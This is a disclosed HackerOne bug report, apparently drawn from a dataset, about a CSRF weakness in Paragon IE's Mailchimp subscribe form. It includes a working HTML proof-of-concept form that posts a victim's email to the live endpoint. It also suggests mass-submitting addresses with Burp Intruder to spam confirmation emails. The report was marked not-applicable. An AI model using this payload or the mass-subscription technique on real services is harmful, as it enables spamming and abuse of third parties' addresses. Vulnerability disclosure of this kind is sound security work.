---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '115323'
original_report_id: '115323'
title: CSRF  AT SUBSCRIBE TO LIST
weakness: Cross-Site Request Forgery (CSRF)
team_handle: paragonie
created_at: '2016-02-08T04:55:47.417Z'
disclosed_at: '2016-05-05T07:22:33.693Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 4
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF  AT SUBSCRIBE TO LIST

## Metadata

- HackerOne Report ID: 115323
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: paragonie
- Disclosed At: 2016-05-05T07:22:33.693Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hello,

You Have Subscribe Form At  http://paragonie.us11.list-manage2.com/subscribe?u=260ff2c88e0a7e103f01ccd79&id=8ddb8569ca

When We Enter Details And Click on Subscribe.

We Get Following Request

<html>
  <body>
    <form action="http://paragonie.us11.list-manage.com/subscribe/post" method="POST">
      <input type="hidden" name="u" value="260ff2c88e0a7e103f01ccd79" />
      <input type="hidden" name="id" value="8ddb8569ca" />
      <input type="hidden" name="MERGE0" value="victim@gmail.com" />
      <input type="hidden" name="MERGE1" value="arbaz" />
      <input type="hidden" name="MERGE2" value="hussain" />
      <input type="hidden" name="MERGE3" value="google" />
      <input type="hidden" name="EMAILTYPE" value="html" />
      <input type="hidden" name="b&#95;260ff2c88e0a7e103f01ccd79&#95;8ddb8569ca" value="" />
      <input type="hidden" name="submit" value="Subscribe&#32;to&#32;list" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Just Try to Add Email ('MERGE0') And Pass the Request , Attacker can Also send that Form Request to Burp Intruder by Adding Email List To Send Confirmation Link to ALL  as Spam Or He Can Perform CSRF attack TO Send Confirmation By Using Above POC Code,


Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
